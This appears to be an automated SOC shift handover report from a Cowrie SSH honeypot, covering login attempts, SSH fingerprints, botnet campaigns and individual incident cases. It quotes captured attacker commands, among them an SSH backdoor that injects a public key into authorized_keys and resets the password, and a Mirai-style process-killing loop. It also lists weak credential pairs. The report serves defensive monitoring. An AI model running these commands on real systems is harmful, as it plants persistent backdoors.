# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-29 |
| **Generated At** | 2026-07-29T23:02:09Z |
| **Shift Time** | 23:02 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **143** |
| Confirmed Threats | **124** |
| False Positives Filtered | **19** (13.3%) |
| Unique Attacker IPs | **67** |
| Countries of Origin | **29** |
| High Severity Cases | **50** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **93** |
| Malware Samples Analyzed | **4** HIGH · **29** MED · 12 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **66** |
| Unique Credential Pairs | **30** |
| Unique Usernames | **15** |
| Unique Passwords | **27** |
| Successful Auth Pairs | **53** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 22 |
| `support` | 7 |
| `guest` | 5 |
| `centos` | 5 |
| `345gs5662d34` | 4 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `support1` | 4 |
| `smo@@kkklss` | 4 |
| `345gs5662d34` | 4 |
| `3245gs5662d34` | 4 |
| `root7` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `support` | `support1` | 4 |
| `root` | `smo@@kkklss` | 4 |
| `345gs5662d34` | `345gs5662d34` | 4 |
| `root` | `root7` | 4 |
| `centos` | `centos3` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `operator` | `p@ssword` | `117.250.250.2` | 2026-07-29T20:57:51 |
| `admin` | `admin` | `159.65.143.47` | 2026-07-29T21:02:04 |
| `admin` | `admin` | `130.12.180.51` | 2026-07-29T21:02:05 |
| `support` | `support` | `176.53.159.196` | 2026-07-29T21:04:22 |
| `guest` | `Passw0rd` | `10.0.0.73` | 2026-07-29T21:06:37 |
| `operator` | `159753` | `78.187.9.111` | 2026-07-29T21:07:20 |
| `operator` | `p@ssword` | `10.0.0.73` | 2026-07-29T21:09:40 |
| `ubnt` | `ubnt12345678` | `10.0.0.73` | 2026-07-29T21:18:38 |
| `ubnt` | `ubnt12345678` | `153.37.177.219` | 2026-07-29T21:23:48 |
| `ubnt` | `ubnt12345678` | `178.178.194.134` | 2026-07-29T21:24:03 |
| `guest` | `Passw0rd` | `111.70.32.6` | 2026-07-29T21:25:33 |
| `default` | `default5` | `85.30.248.213` | 2026-07-29T21:32:43 |
| `support` | `support1` | `10.0.0.73` | 2026-07-29T21:40:19 |
| `support` | `support1` | `123.212.9.122` | 2026-07-29T21:41:59 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-29T21:42:19 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-29T21:42:19 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-29T21:42:20 |
| `ypy` | `ypy` | `103.30.40.129` | 2026-07-29T21:42:58 |
| `345gs5662d34` | `345gs5662d34` | `103.30.40.129` | 2026-07-29T21:43:01 |
| `ypy` | `3245gs5662d34` | `103.30.40.129` | 2026-07-29T21:43:03 |
| `root` | `root7` | `10.0.0.73` | 2026-07-29T21:52:12 |
| `root` | `root7` | `65.20.149.26` | 2026-07-29T21:57:40 |
| `root` | `root7` | `95.79.108.51` | 2026-07-29T21:57:52 |
| `support` | `support1` | `218.202.143.68` | 2026-07-29T21:58:36 |
| `support` | `support1` | `61.37.150.6` | 2026-07-29T21:58:45 |
| `centos` | `centos12` | `218.23.95.14` | 2026-07-29T21:59:58 |
| `jitendra` | `12345678` | `116.181.10.189` | 2026-07-29T22:00:24 |
| `default` | `default5` | `63.135.169.175` | 2026-07-29T22:02:21 |
| `default` | `default5` | `180.180.232.242` | 2026-07-29T22:02:30 |
| `guest` | `guest1` | `178.178.222.61` | 2026-07-29T22:17:02 |
| `guest` | `guest1` | `196.191.151.172` | 2026-07-29T22:17:14 |
| `centos` | `centos3` | `10.0.0.73` | 2026-07-29T22:19:33 |
| `nobody` | `nobody123456` | `10.0.0.73` | 2026-07-29T22:26:15 |
| `support` | `support` | `10.0.0.73` | 2026-07-29T22:28:33 |
| `unknown` | `unknown77` | `208.109.38.143` | 2026-07-29T22:35:01 |
| `unknown` | `unknown77` | `117.247.77.115` | 2026-07-29T22:35:09 |
| `unknown` | `unknown77` | `153.37.177.219` | 2026-07-29T22:35:12 |
| `centos` | `centos3` | `181.129.31.42` | 2026-07-29T22:37:19 |
| `centos` | `centos3` | `183.104.220.84` | 2026-07-29T22:37:28 |
| `root` | `orangepi` | `210.0.90.81` | 2026-07-29T22:42:39 |
| `root` | `santosh` | `181.188.148.74` | 2026-07-29T22:45:01 |
| `345gs5662d34` | `345gs5662d34` | `181.188.148.74` | 2026-07-29T22:45:05 |
| `root` | `3245gs5662d34` | `181.188.148.74` | 2026-07-29T22:45:06 |
| `root` | `admin` | `106.114.105.179` | 2026-07-29T22:45:35 |
| `ftp` | `qwerty` | `211.240.117.75` | 2026-07-29T22:46:31 |
| `345gs5662d34` | `345gs5662d34` | `211.240.117.75` | 2026-07-29T22:46:35 |
| `ftp` | `3245gs5662d34` | `211.240.117.75` | 2026-07-29T22:46:36 |
| `root` | `santosh` | `152.32.252.65` | 2026-07-29T22:49:06 |
| `345gs5662d34` | `345gs5662d34` | `152.32.252.65` | 2026-07-29T22:49:10 |
| `root` | `3245gs5662d34` | `152.32.252.65` | 2026-07-29T22:49:12 |
| `supervisor` | `passwd` | `10.0.0.73` | 2026-07-29T22:49:58 |
| `root` | `` | `91.92.40.18` | 2026-07-29T22:50:58 |
| `root` | `orangepi` | `10.0.0.73` | 2026-07-29T22:54:34 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **143** |
| Sessions with Fingerprint | **10** |
| Unique HASSH Fingerprints | **10** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| OpenSSH | 23 |
| libssh | 20 |
| Paramiko (Python) | 8 |
| Go SSH scanner | 3 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 23 | 22 |
| `f555226df196...` | Mirai/variant | 13 | 5 |
| `a2de0f306611...` | Mirai/variant | 8 | 1 |
| `eff4c24daffc...` | Modern SSH client | 2 | 1 |
| `19532158b559...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 23 | 22 | Mirai/variant |
| `f555226df196...` | libssh | 13 | 5 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 8 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 5 | 2 | — |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |
| `19532158b559...` | libssh | 1 | 1 | Mirai/variant |
| `5f904648ee89...` | Go SSH scanner | 1 | 1 | Generic scanner |
| `5bd26477da54...` | PuTTY | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **5** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1059.004, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 4 | 4 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo WRITABLE >/tmp/.testfile 2>&1
```
```
ls -l /tmp/.testfile 2>&1
```
```
rm -f /tmp/.testfile
```
```
cd /tmp
```
```
for pid in /proc/[0-9]*; do pid_num="${pid##*/}"; if [ -r "$pid/maps" ]; then suspicious=true; while IFS= read -r line; do case "$line" in *"/lib/"*|*"/lib64/"*|*".so"*) suspicious=false; break;; esac; done < "$pid/maps"; if [ "$suspicious" = true ]; then kill -9 "$pid_num" 2>/dev/null; fi; fi; done;
```
Source IPs: `91.92.40.18`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo -e "12345678\nbYGI544Nh7OO\nbYGI544Nh7OO"|passwd|bash
```
```
Enter new UNIX password:
```
Source IPs: `116.181.10.189`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `181.188.148.74`, `103.30.40.129`, `152.32.252.65`, `211.240.117.75`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **67** |
| Unique ASNs | **52** |
| High-Risk ASNs | **42** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS22773` | Cox Communications Inc. | 4 | MEDIUM |
| `AS46562` | Performive LLC | 4 | MEDIUM |
| `AS4134` | CHINANET BACKBONE | 3 | HIGH |
| `AS26496` | GoDaddy.com, LLC | 3 | HIGH |
| `AS133119` | China Unicom IP network | 2 | HIGH |
| `AS396982` | Google LLC | 2 | LOW |
| `AS25159` | PJSC MegaFon | 2 | HIGH |
| `AS9829` | National Internet Backbone | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (50)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-5a265b3143ab

| Field | Detail |
|---|---|
| **Source IP** | `117.250.250[.]2` |
| **First Seen** | 2026-07-29 20:57 |
| **Last Seen** | 2026-07-29 20:57 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 20:57:48` | `cowrie.session.connect` |
| `2026-07-29 20:57:49` | `cowrie.client.version` |
| `2026-07-29 20:57:49` | `cowrie.client.kex` |
| `2026-07-29 20:57:51` | `cowrie.login.success` |
| `2026-07-29 20:57:51` | `cowrie.direct-tcpip.request` |
| `2026-07-29 20:57:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.250.250[.]2` to AbuseIPDB if not already reported
- [ ] Block `117.250.250[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57324336aec1

| Field | Detail |
|---|---|
| **Source IP** | `159.65.143[.]47` |
| **First Seen** | 2026-07-29 21:02 |
| **Last Seen** | 2026-07-29 21:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 21:02:03` | `cowrie.session.connect` |
| `2026-07-29 21:02:03` | `cowrie.client.version` |
| `2026-07-29 21:02:03` | `cowrie.client.kex` |
| `2026-07-29 21:02:04` | `cowrie.login.success` |
| `2026-07-29 21:02:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.65.143[.]47` to AbuseIPDB if not already reported
- [ ] Block `159.65.143[.]47` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b6a50d0fee5

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-07-29 21:02 |
| **Last Seen** | 2026-07-29 21:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 21:02:04` | `cowrie.session.connect` |
| `2026-07-29 21:02:04` | `cowrie.client.version` |
| `2026-07-29 21:02:04` | `cowrie.client.kex` |
| `2026-07-29 21:02:05` | `cowrie.login.success` |
| `2026-07-29 21:02:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a29d2504ff71

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-29 21:04 |
| **Last Seen** | 2026-07-29 21:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 21:04:22` | `cowrie.session.connect` |
| `2026-07-29 21:04:22` | `cowrie.client.version` |
| `2026-07-29 21:04:22` | `cowrie.client.kex` |
| `2026-07-29 21:04:22` | `cowrie.login.success` |
| `2026-07-29 21:04:23` | `cowrie.direct-tcpip.request` |
| `2026-07-29 21:04:23` | `cowrie.direct-tcpip.data` |
| `2026-07-29 21:04:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-947fb4ceeada

| Field | Detail |
|---|---|
| **Source IP** | `78.187.9[.]111` |
| **First Seen** | 2026-07-29 21:07 |
| **Last Seen** | 2026-07-29 21:07 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 21:07:18` | `cowrie.session.connect` |
| `2026-07-29 21:07:18` | `cowrie.client.version` |
| `2026-07-29 21:07:18` | `cowrie.client.kex` |
| `2026-07-29 21:07:20` | `cowrie.login.success` |
| `2026-07-29 21:07:20` | `cowrie.direct-tcpip.request` |
| `2026-07-29 21:07:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.187.9[.]111` to AbuseIPDB if not already reported
- [ ] Block `78.187.9[.]111` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09888e00da03

| Field | Detail |
|---|---|
| **Source IP** | `153.37.177[.]219` |
| **First Seen** | 2026-07-29 21:23 |
| **Last Seen** | 2026-07-29 21:23 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 21:23:45` | `cowrie.session.connect` |
| `2026-07-29 21:23:46` | `cowrie.client.version` |
| `2026-07-29 21:23:46` | `cowrie.client.kex` |
| `2026-07-29 21:23:48` | `cowrie.login.success` |
| `2026-07-29 21:23:49` | `cowrie.direct-tcpip.request` |
| `2026-07-29 21:23:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `153.37.177[.]219` to AbuseIPDB if not already reported
- [ ] Block `153.37.177[.]219` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08510c2fca21

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]134` |
| **First Seen** | 2026-07-29 21:24 |
| **Last Seen** | 2026-07-29 21:24 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 21:24:00` | `cowrie.session.connect` |
| `2026-07-29 21:24:01` | `cowrie.client.version` |
| `2026-07-29 21:24:01` | `cowrie.client.kex` |
| `2026-07-29 21:24:03` | `cowrie.login.success` |
| `2026-07-29 21:24:04` | `cowrie.direct-tcpip.request` |
| `2026-07-29 21:24:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]134` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]134` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55a1e2c2da73

| Field | Detail |
|---|---|
| **Source IP** | `111.70.32[.]6` |
| **First Seen** | 2026-07-29 21:25 |
| **Last Seen** | 2026-07-29 21:25 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 21:25:29` | `cowrie.session.connect` |
| `2026-07-29 21:25:30` | `cowrie.client.version` |
| `2026-07-29 21:25:30` | `cowrie.client.kex` |
| `2026-07-29 21:25:33` | `cowrie.login.success` |
| `2026-07-29 21:25:33` | `cowrie.direct-tcpip.request` |
| `2026-07-29 21:25:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.32[.]6` to AbuseIPDB if not already reported
- [ ] Block `111.70.32[.]6` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e5486bd905e

| Field | Detail |
|---|---|
| **Source IP** | `85.30.248[.]213` |
| **First Seen** | 2026-07-29 21:32 |
| **Last Seen** | 2026-07-29 21:32 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 21:32:42` | `cowrie.session.connect` |
| `2026-07-29 21:32:42` | `cowrie.client.version` |
| `2026-07-29 21:32:42` | `cowrie.client.kex` |
| `2026-07-29 21:32:43` | `cowrie.login.success` |
| `2026-07-29 21:32:44` | `cowrie.direct-tcpip.request` |
| `2026-07-29 21:32:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.30.248[.]213` to AbuseIPDB if not already reported
- [ ] Block `85.30.248[.]213` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74410d094167

| Field | Detail |
|---|---|
| **Source IP** | `123.212.9[.]122` |
| **First Seen** | 2026-07-29 21:41 |
| **Last Seen** | 2026-07-29 21:42 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 21:41:56` | `cowrie.session.connect` |
| `2026-07-29 21:41:57` | `cowrie.client.version` |
| `2026-07-29 21:41:57` | `cowrie.client.kex` |
| `2026-07-29 21:41:59` | `cowrie.login.success` |
| `2026-07-29 21:42:00` | `cowrie.direct-tcpip.request` |
| `2026-07-29 21:42:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.212.9[.]122` to AbuseIPDB if not already reported
- [ ] Block `123.212.9[.]122` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e34e1a20b2df

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-29 21:42 |
| **Last Seen** | 2026-07-29 21:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 21:42:19` | `cowrie.session.connect` |
| `2026-07-29 21:42:19` | `cowrie.client.version` |
| `2026-07-29 21:42:19` | `cowrie.client.kex` |
| `2026-07-29 21:42:19` | `cowrie.login.success` |
| `2026-07-29 21:42:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0aa7fead5b41

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-29 21:42 |
| **Last Seen** | 2026-07-29 21:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 21:42:19` | `cowrie.session.connect` |
| `2026-07-29 21:42:19` | `cowrie.client.version` |
| `2026-07-29 21:42:19` | `cowrie.client.kex` |
| `2026-07-29 21:42:19` | `cowrie.login.success` |
| `2026-07-29 21:42:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cce0ec52bdf8

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-29 21:42 |
| **Last Seen** | 2026-07-29 21:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 21:42:20` | `cowrie.session.connect` |
| `2026-07-29 21:42:20` | `cowrie.client.version` |
| `2026-07-29 21:42:20` | `cowrie.client.kex` |
| `2026-07-29 21:42:20` | `cowrie.login.success` |
| `2026-07-29 21:42:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ee1c7d08b03

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-29 21:42 |
| **Last Seen** | 2026-07-29 21:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 21:42:20` | `cowrie.session.connect` |
| `2026-07-29 21:42:20` | `cowrie.client.version` |
| `2026-07-29 21:42:20` | `cowrie.client.kex` |
| `2026-07-29 21:42:20` | `cowrie.login.success` |
| `2026-07-29 21:42:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-315a67a49136

| Field | Detail |
|---|---|
| **Source IP** | `103.30.40[.]129` |
| **First Seen** | 2026-07-29 21:42 |
| **Last Seen** | 2026-07-29 21:43 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 21:42:57` | `cowrie.session.connect` |
| `2026-07-29 21:42:57` | `cowrie.client.version` |
| `2026-07-29 21:42:58` | `cowrie.client.kex` |
| `2026-07-29 21:42:58` | `cowrie.login.success` |
| `2026-07-29 21:42:59` | `cowrie.session.params` |
| `2026-07-29 21:42:59` | `cowrie.command.input` |
| `2026-07-29 21:42:59` | `cowrie.command.failed` |
| `2026-07-29 21:42:59` | `cowrie.log.closed` |
| `2026-07-29 21:43:00` | `cowrie.session.params` |
| `2026-07-29 21:43:00` | `cowrie.command.input` |
| `2026-07-29 21:43:00` | `cowrie.session.file_download` |
| `2026-07-29 21:43:00` | `cowrie.log.closed` |
| `2026-07-29 21:43:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.30.40[.]129` to AbuseIPDB if not already reported
- [ ] Block `103.30.40[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-272eeaf35896

| Field | Detail |
|---|---|
| **Source IP** | `103.30.40[.]129` |
| **First Seen** | 2026-07-29 21:43 |
| **Last Seen** | 2026-07-29 21:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 21:43:01` | `cowrie.session.connect` |
| `2026-07-29 21:43:01` | `cowrie.client.version` |
| `2026-07-29 21:43:01` | `cowrie.client.kex` |
